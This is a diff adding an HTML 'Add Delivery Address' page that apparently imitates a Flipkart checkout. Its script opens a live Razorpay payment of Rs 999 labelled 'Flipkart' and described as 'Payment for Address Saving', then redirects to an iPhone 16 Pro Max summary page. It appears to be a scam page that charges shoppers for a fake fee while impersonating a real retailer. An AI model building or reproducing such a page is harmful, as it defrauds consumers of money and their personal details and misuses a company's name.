@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Add Delivery Address</title>
+  <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+    }
+    .container {
+      max-width: 95%;
+      margin: 20px auto;
+      padding: 20px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+    .container h2 {
+      margin-bottom: 20px;
+      font-size: 18px;
+      color: #333;
+      text-align: center;
+    }
+    .step-indicator {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+    .step-indicator div {
+      flex: 1;
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+    }
+    .step-indicator div.active {
+      color: #333;
+      font-weight: bold;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+    input {
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .inline-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .inline-group input {
+      flex: 1 1 calc(50% - 10px);
+      min-width: 150px;
+    }
+    button {
+      padding: 12px;
+      font-size: 16px;
+      color: #fff;
+      background-color: #ff6200;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #e55a00;
+    }
+
+    /* Mobile responsiveness */
+    @media (max-width: 600px) {
+      .inline-group input {
+        flex: 1 1 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Add Delivery Address</h2>
+    <div class="step-indicator">
+      <div class="active">1 Address</div>
+      <div>2 Order Summary</div>
+      <div>3 Payment</div>
+    </div>
+    <form onsubmit="return initiatePayment(event)">
+      <input type="text" placeholder="Full Name" required>
+      <input type="text" placeholder="Mobile Number" required>
+      <input type="text" placeholder="Pincode" required>
+      <div class="inline-group">
+        <input type="text" placeholder="City" required>
+        <input type="text" placeholder="State" required>
+      </div>
+      <input type="text" placeholder="House No., Building Name" required>
+      <input type="text" placeholder="Road name, Area, Colony" required>
+      <button type="submit">Save Address</button>
+    </form>
+  </div>
+  
+  <script>
+    function initiatePayment(event) {
+      event.preventDefault(); // Prevent default form submission
+      
+      // Razorpay payment details
+      var options = {
+        key: "rzp_live_elxzEEFkwxBLHR", // Your Razorpay API key
+        amount: 99900, // Amount in paise (₹999 = 99900 paise)
+        currency: "INR",
+        name: "Flipkart", // Official name to show in the payment message
+        description: "Payment for Address Saving",
+        image: "https://yourstorelogo.com/logo.png", // Optional: Logo to display on Razorpay popup
+        handler: function(response) {
+          console.log("Payment successful! Payment ID: " + response.razorpay_payment_id);
+          window.location.href = "iphone%2016%20Pro%20max%20summary.html"; // Redirect after successful payment
+        },
+        prefill: {
+          name: document.querySelector('input[placeholder="Full Name"]').value,
+          email: "", // Add email if required
+          contact: document.querySelector('input[placeholder="Mobile Number"]').value
+        },
+        notes: {
+          address: document.querySelector('input[placeholder="House No., Building Name"]').value + ', ' + document.querySelector('input[placeholder="Road name, Area, Colony"]').value
+        },
+        theme: {
+          color: "#ff6200"
+        }
+      };
+      
+      var rzp1 = new Razorpay(options);
+      rzp1.open(); // Open the Razorpay payment gateway
+      return false; // Prevent form submission
+    }
+  </script>
+</body>
+</html>
